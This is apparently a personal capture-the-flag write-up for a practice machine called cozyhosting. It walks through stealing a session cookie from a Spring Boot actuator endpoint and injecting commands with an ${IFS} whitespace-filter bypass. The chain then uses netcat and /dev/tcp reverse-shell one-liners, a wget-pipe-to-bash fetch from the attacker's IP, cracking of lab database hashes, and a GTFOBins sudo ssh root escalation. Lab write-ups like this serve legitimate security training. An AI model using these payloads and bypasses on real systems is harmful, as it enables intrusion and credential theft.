Main steps
1. Enumerate website and found an error page showing what software it runs
2. Directory fuzzing shows a debug directory for the software
3. Enumerate the directory and found a session token
4. Gained login access to admin dashboard using cookie
5. Enumerate dashboard to find command injection vulnerability
6. Gain initial access by uploading reverse shell script
7. Enumerate .jar file by unzipping and looking at default properties file
8. Access database using credentials found
9. Found more credentials in database and used to pivot
10. Enumerate `sudo -l` to privilege escalate

Learning points
1. Use raft-medium-words not big for directory fuzzing
2. Google the backend technologies found with like 'pentesting' or 'exploiting' prepended
3. ${IFS}, the internal file separator, can be used to circumvent whitespace checking for Linux servers
4. .jar files can be unzipped to provide information

nmap
![[Pasted image 20260304165138.png]]
ports 22 and 80 open
added cozyhosting.htb to /etc/hosts

![[Pasted image 20260304165447.png]]
Navigating to random pages shows this error - Whitelabel
This is an error page for the Spring Boot framework when an unhandled exception occurs

Feroxbuster also returned a 200 for this link but does not seem to be anything here
![[Pasted image 20260304165753.png]]
Found a /actuator directory
![[Pasted image 20260304175441.png]]
![[Pasted image 20260304182540.png]]

Referring to this page https://exploitnotes.org/exploit/web/framework/spring-boot-actuator
Navigating to /actuator/sessions shown in the actuator page shows this, which is a potential session cookie
![[Pasted image 20260304183141.png]]
717D7809CB3F3B7326DDF942DAFF8D2D :"kanderson"

Attempted to access the /admin page using this cookie through burpsuite
![[Pasted image 20260304183512.png]]

The session cookie changes after a while so needed to refresh the /actuator/sessions to get the most recent token, but was eventually able to access the admin dashboard

Added the cookie to dev console storage to maintain login
![[Pasted image 20260304184814.png]]
![[Pasted image 20260304183915.png]]

test:test into the connection settings resulted in this error
![[Pasted image 20260304184840.png]]

Tried with a hostname, 127.0.0.1
![[Pasted image 20260304184905.png]]

Tried using my Kali's IP
![[Pasted image 20260304184938.png]]

The server seems to be trying to connect through `ssh username@hostname` 
Potentially able to inject commands through the fields - since hostname needs to be an actual hostname, need to use username

Tried curling my web server using the username field
![[Pasted image 20260304185516.png]]

Used the Linux IFS to send `test;curl${IFS}http://10.10.14.71/linpeas.sh` to check if the command could be triggered and saw the request to my http server
![[Pasted image 20260304185752.png]]

Tried to send `test;rm${IFS}/tmp/f;mkfifo${IFS}/tmp/f;cat${IFS}/tmp/f|/bin/sh${IFS}-i${IFS}2>&1|nc${IFS}10.10.14.71${IFS}4444${IFS}>/tmp/f`
to spawn a reverse shell but it timed out

Wrote a .sh script containing a reverse shell bash one liner
`#!/bin/bash`
`sh -i >& /dev/tcp/10.10.14.71/4444 0>&1`
and served it using `test;wget${IFS}-qO-${IFS}http://10.10.14.71/shell1.sh|bash;`
(wget needs the -qO- option, curl does not and can pipe script directly to bash)

Got access as 'app'
![[Pasted image 20260304192016.png]]

/etc/passwd shows another user josh
![[Pasted image 20260304192059.png]]
There is a cloudhosting-0.0.1.jar file in /app - jar files can be unzipped to view the information inside like class files, property files etc.
Unzipped the jar file to /tmp/app and checked the default Spring Boot application.properties file at /BOOT-INF/classes/application.properties
This gave a postgresql database password
![[Pasted image 20260304193712.png]]
postgres:Vg&nvzAQ7XxR
Tried to connect to the database using `psql -h 127.0.0.1 -U postgres` and was able to
![[Pasted image 20260304194059.png]]

Enumerating the psql using `\l` shows a database named 'cozyhosting'. Connected to this database and enumerated the tables with `\dt` and found a users table. Read the table using `SELECT * FROM USERS` and found two accounts with hashed passwords, including an admin account.
![[Pasted image 20260304194441.png]]

`$2a$` hashes are Bcrypt hashes. Ran hashcat on this hash with `rockyou.txt` and got the password for 'admin', manchesterunited
![[Pasted image 20260304194649.png]]
Tried using this password on the 'josh' user and was able to gain SSH access.
![[Pasted image 20260304194810.png]]
Enumerated `sudo -l` since I have the password and saw that SSH can be run as sudo.
![[Pasted image 20260304195100.png]]

On GTFOBins: 3 ways to spawn a root shell with SSH with sudo privileges.

First method: `ssh localhost /bin/sh`
Did not work as it prompts for the root password
![[Pasted image 20260304195300.png]]

Second method: `ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x`
Worked and spawned a root shell.
![[Pasted image 20260304195311.png]]